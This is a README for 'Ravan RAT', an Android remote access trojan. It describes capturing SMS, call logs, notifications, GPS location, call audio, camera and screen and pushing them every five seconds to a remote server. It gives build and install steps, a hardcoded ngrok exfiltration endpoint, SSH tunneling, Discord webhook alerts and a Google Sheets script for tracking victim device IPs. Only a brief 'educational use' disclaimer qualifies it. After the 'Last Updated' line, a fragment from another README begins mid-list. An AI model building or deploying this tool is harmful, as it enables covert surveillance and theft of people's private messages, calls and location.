# Ravan RAT

**Remote Access Tool for Android with Real-Time Data Exfiltration**

Ravan is a comprehensive Android RAT (Remote Access Trojan) designed to capture and exfiltrate phone data in real-time to a remote PC server. It combines on-device data capture, local web control, Discord notifications, and SSH tunnel automation.

## Overview

Ravan operates on a two-tier architecture:

1. **Phone Side** (Android Service) – Runs as a background service, captures sensitive data (SMS, calls, notifications, location), and periodically POSTs to a PC server
2. **PC Server** (Node.js) – Receives data from phones, stores in memory, and provides a web UI for monitoring and analysis

The system uses Serveo SSH tunneling for remote access and Discord webhooks for real-time alerts.

## Architecture

### Phone Components

```
HttpServerService (Main Background Service)
├── RavanHttpServer (Local HTTP server on :8080)
├── Serveo SSH Tunnel (Remote access via serveo.net)
├── Periodic Data Push (Every 5 seconds)
├── Discord Webhook Reporting
└── Network Monitoring

Companion Services:
├── CallRecordService – Records incoming/outgoing calls
├── CameraService – Captures camera streams & photos
├── NotificationListener – Intercepts system notifications
└── LauncherRefreshService – Monitors app usage
```

### PC Server

```
server.js (Node.js HTTP Server on port 8080)
├── POST /api/data – Receives device payloads
├── GET / – Dashboard showing all connected devices
├── GET /device/:id – Device detail view with data history
└── In-Memory Storage – Stores up to 50 payloads per device
```

## Features

### Phone-Side Capture

- **SMS Messages** – Read, send, and delete SMS
- **Call Logs** – Incoming, outgoing, missed calls with duration
- **Notifications** – Intercept app notifications in real-time
- **GPS Location** – GPS and network-based location data
- **Device Info** – Model, Android version, SDK, public/local IP
- **Call Recording** – Record VoIP and microphone audio
- **Camera Access** – Front/back camera photos and video streams
- **Screen Recording** – Capture device screen activity
- **Local Web Panel** – Control RAT from local network

### Server-Side Monitoring

- **Multi-Device Dashboard** – Track all connected phones
- **Real-Time Data Sync** – Receive updates every 5 seconds
- **Device Detail Pages** – View SMS, calls, notifications, location per device
- **Data History** – Keep 50 historical payloads per device
- **JSON Export** – View raw captured data in JSON format

### Tunneling & Reporting

- **Serveo SSH Tunneling** – Remote access without port forwarding
- **Discord Webhooks** – Real-time IP and tunnel URL alerts
- **Network Callbacks** – Detect IP changes and auto-reconnect
- **SSH-Only Dependencies** – No binary downloads required

## Installation & Setup

### Prerequisites

#### Phone (Android)

- Android 10+ (API 29+)
- Gradle build system
- Android Manifest permissions (READ_SMS, READ_CALL_LOG, ACCESS_FINE_LOCATION, RECORD_AUDIO, CAMERA, etc.)

#### PC Server

- Node.js 12+ with `http` module (built-in)
- Port 8080 available (or use `PORT` environment variable)

### Build & Deploy

#### 1. Build Android APK

```bash
cd /mnt/projects/RavanRAT
./gradlew assembleDebug
```

Build artifacts will be in `app/build/outputs/apk/debug/app-debug.apk`

#### 2. Install on Android Device

```bash
adb install app/build/outputs/apk/debug/app-debug.apk
```

Or manually transfer the APK and install via your device's file manager.

#### 3. Launch PC Server

```bash
cd /mnt/projects/RavanRAT
node server.js
# Output: Ravan RAT data server listening on port 8080
```

Access the web dashboard at `http://localhost:8080`

#### 4. Configure Remote Endpoint

Edit `app/src/main/java/com/security/ravan/HttpServerService.java` and update:

```java
private static final String REMOTE_DATA_ENDPOINT = "https://wrench-unending-vanity.ngrok-free.dev/api/data";
```

Replace with your actual PC server URL. Use ngrok or ngrok-free for HTTPS tunneling.

#### 5. Configure Discord Webhook (Optional)

Edit the same file and update:

```java
private static final String DISCORD_WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE";
```

### Grant Permissions

After installation, grant required permissions:

1. Open Ravan app
2. Tap settings icon (⚙️)
3. Follow permission prompts for:
   - SMS (read/write)
   - Call logs
   - Location
   - Camera
   - Microphone
   - Storage
   - Contacts

## Usage

### Phone App

1. **Launch Ravan** – App starts background services automatically
2. **Local Web Panel** – Accessible from any device on the local network at `http://[phone-ip]:8080`
3. **View Logs** – Tap "Logs" tab to see service activity
4. **Manual Commands** – Use web panel to trigger captures or actions

### PC Server Web UI

1. **Dashboard** – Shows all connected devices with model, IP, last update time
2. **Device Detail** – Click a device to see:
   - Device metadata
   - Latest captured payload
   - Historical payloads (up to 50)
3. **Data Fields** – View SMS messages, call logs, notifications, location in JSON

### Example API Request

```bash
curl -X POST http://localhost:8080/api/data \
  -H "Content-Type: application/json" \
  -d '{
    "deviceId": "device-001",
    "deviceModel": "Pixel 6",
    "publicIp": "203.0.113.45",
    "localIp": "192.168.1.100",
    "notifications": [...],
    "calls": [...],
    "sms": [...],
    "location": {...}
  }'
```

## Project Structure

```
RavanRAT/
├── README.md                          # This file
├── server.js                          # PC server (Node.js)
├── build.gradle                       # Root Gradle config
├── settings.gradle
├── gradlew / gradlew.bat
├── app/
│   ├── build.gradle                   # App build config
│   ├── src/main/
│   │   ├── AndroidManifest.xml        # Permissions & services
│   │   ├── java/com/security/ravan/
│   │   │   ├── MainActivity.java              # App entry point
│   │   │   ├── HttpServerService.java        # Main service (data push + Serveo)
│   │   │   ├── RavanHttpServer.java          # Local HTTP server
│   │   │   ├── CallRecordService.java        # Call recording
│   │   │   ├── CameraService.java            # Camera capture
│   │   │   ├── NotificationListener.java     # Notification interception
│   │   │   ├── NotificationRecord.java       # Notification data model
│   │   │   ├── NotificationStore.java        # Notification persistence
│   │   │   ├── RATLogger.java                # In-memory logging
│   │   │   ├── CallReceiver.java             # Call state broadcast receiver
│   │   │   └── LauncherRefreshService.java   # App usage tracking
│   │   └── res/                       # Resources (images, layouts)
│   └── build/                         # Build outputs
├── gradle/wrapper/
├── builder/                           # Build scripts
└── images/                            # Screenshots / media
```

## Key Files Explained

### HttpServerService.java

**Main background service** responsible for:
- Starting the local HTTP server
- Establishing Serveo SSH tunnel
- Sending periodic data to PC server (every 5 seconds)
- Monitoring network changes
- Discord webhook integration
- Collecting SMS, calls, notifications, location

**Key Methods:**
- `startPeriodicDataPush()` – Schedules 5-second data push cycle
- `buildCapturedDataPayload()` – Assembles JSON with phone data
- `sendJsonPost()` – POSTs JSON to remote endpoint
- `setupServeoTunnelAndSendWebhook()` – Starts SSH tunnel

### RavanHttpServer.java

**Local HTTP server** running on port 8080, provides:
- Web UI for local control
- SMS read/send/delete endpoints
- Call logs viewer
- Location fetch
- Camera & screen recording controls
- File manager
- Notification history

### NotificationStore.java & NotificationRecord.java

**Notification persistence layer:**
- Intercepts system notifications via NotificationListener
- Stores up to 500 notifications
- Persists to JSON file for reliability
- Serializes for transmission to PC

### server.js

**PC server** receives data from phones:
- `POST /api/data` handler stores payloads by device ID
- `GET /` renders dashboard with all devices
- `GET /device/:id` renders detail view with history
- In-memory storage with 50-payload history per device

## Data Push Cycle

```
Every 5 seconds:
1. Collect SMS (last 20)
2. Collect Call Logs (last 20)
3. Collect Notifications (all stored)
4. Get GPS Location
5. Build JSON payload
6. POST to Remote Endpoint
7. Log response code
```

## Permissions Required

```xml
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.READ_SMS" />
<uses-permission android:name="android.permission.SEND_SMS" />
<uses-permission android:name="android.permission.READ_CALL_LOG" />
<uses-permission android:name="android.permission.WRITE_CALL_LOG" />
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
<uses-permission android:name="android.permission.RECORD_AUDIO" />
<uses-permission android:name="android.permission.CAMERA" />
<uses-permission android:name="android.permission.READ_CONTACTS" />
<uses-permission android:name="android.permission.BODY_SENSORS" />
```

## Configuration

### Remote Endpoint

Update in `HttpServerService.java`:

```java
private static final String REMOTE_DATA_ENDPOINT = "https://your-endpoint.com/api/data";
private static final int DATA_PUSH_INTERVAL_SECONDS = 5; // Change push interval
```

### Discord Webhook

Set in `HttpServerService.java`:

```java
private static final String DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/TOKEN";
```

### PC Server Port

```bash
PORT=3000 node server.js  # Run on port 3000 instead of 8080
```

## Logging

### Phone Side

View logs via local web panel at `http://[phone-ip]:8080/logs` or use:

```java
RATLogger.log("Your message here");
```

Logs are stored in memory and visible in the web UI.

### PC Server

Logs to console:

```
Ravan RAT data server listening on port 8080
```

Received payloads are logged to console and stored in memory per device.

## Troubleshooting

### Phone doesn't connect to PC server

- Verify PC server is running: `node server.js`
- Check firewall allows port 8080 or configured port
- Verify remote endpoint URL is correct in `HttpServerService.java`
- Check network connectivity on phone
- View logs in phone app's web UI

### No data appearing in dashboard

- Ensure phone has required permissions granted
- Check PC server console for errors
- Verify POST endpoint is receiving requests (add logging to `server.js`)
- Check if phone's scheduled executor is running

### Serveo tunnel not working

- Verify SSH is available on device (rare on Android)
- Check RATLogger for "SSH is not available" message
- Phone will still function locally even if tunnel fails
- Discord webhook will report failure

### Discord notifications not received

- Verify Discord webhook URL is valid
- Check network connectivity when IP changes
- Validate webhook has message permission

## Security Notes

This tool is designed for authorized testing and research only. Users are responsible for ensuring legal compliance in their jurisdiction.

- Phone app requires many system permissions
- Local web panel has no authentication (accessible on local network only)
- PC server stores data in memory (lost on restart)
- Discord webhook URL contains sensitive token (keep private)

## Future Enhancements

- [ ] Persistent database instead of in-memory storage
- [ ] Authentication layer for PC server
- [ ] Data encryption for transit
- [ ] Multi-user support per device
- [ ] Advanced filtering & search
- [ ] Data export (CSV/JSON)
- [ ] Real-time streaming vs. polling
- [ ] Mobile app for remote monitoring

## Support & Development

For issues, feature requests, or contributions, refer to the project's version control system.

---

**Last Updated:** June 2026  
**Status:** Active Development

    - _Format_: `http://[IP_v6_Address]:Port/`
    - _Example_: `http://[2409:40e2:209c:1f7a:xxxx:xxxx:xxxx:xxxx]:8080/`
3.  **Connect**: Click the link in your Google Sheet.
4.  **Control**: You will see the Ravan Web Panel running **directly on the phone**. All commands sent go straight to the device, and data comes straight back to you. P2P at its finest.

---

## 📸 Screenshots

### 📊 Google Sheet Tracking

![Excel Tracking](images/excel.png)

### 📱 Web Panel & Features

|                             |                             |                             |
| --------------------------- | --------------------------- | --------------------------- |
| ![Panel 1](images/img1.png) | ![Panel 2](images/img2.png) | ![Panel 3](images/img3.png) |
| ![Panel 4](images/img4.png) | ![Panel 6](images/img6.png) |
| ![Panel 7](images/img7.png) | ![Panel 8](images/img8.png) | ![Panel 9](images/img9.png) |

---

## 📊 Google Sheet Setup

Want device IPs in a spreadsheet?

1. Create Google Sheet
2. Extensions → Apps Script
3. Paste this **UPDATED** code:

```javascript
function doPost(e) {
  var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
  var data = JSON.parse(e.postData.contents);

  // Get current date/time
  var timestamp = new Date();

  // Add row with: Timestamp | IP | Port | Device Name | Clickable Link
  sheet.appendRow([
    timestamp,
    data.ip,
    data.port,
    data.device,
    data.link, // <--- NEW! Direct Clickable Link
  ]);

  return ContentService.createTextOutput("Success");
}
```

4. Deploy → Web App → Anyone
5. Copy URL → Paste in builder when asked.

---

## 📂 Folder Structure

```
ravan/
├── ravanrat.png          # Logo
├── builder/
│   ├── build.sh          # Linux/Mac
│   ├── build.bat         # Windows CMD
│   ├── build.ps1         # Windows PowerShell
│   └── output/           # Built APKs (Signed & Unsigned)
└── app/                  # Android source
```

---

## 🤝 Contribute

Found a bug? Have an idea?

- Open an issue
- Submit a PR
- DM me on LinkedIn

All contributions welcome!

---

## 👨‍💻 Developer

**Somesh**

[![GitHub](https://img.shields.io/badge/GitHub-someshsrichandan-black?logo=github)](https://github.com/someshsrichandan)
[![LinkedIn](https://img.shields.io/badge/LinkedIn-someshsrichandan-blue?logo=linkedin)](https://linkedin.com/in/someshsrichandan)

---

## ⚠️ Disclaimer

Educational purpose only. Don't use without permission. I'm not responsible for misuse.

---

## 📜 License

MIT License

---

**⭐ Star this repo for updates!**
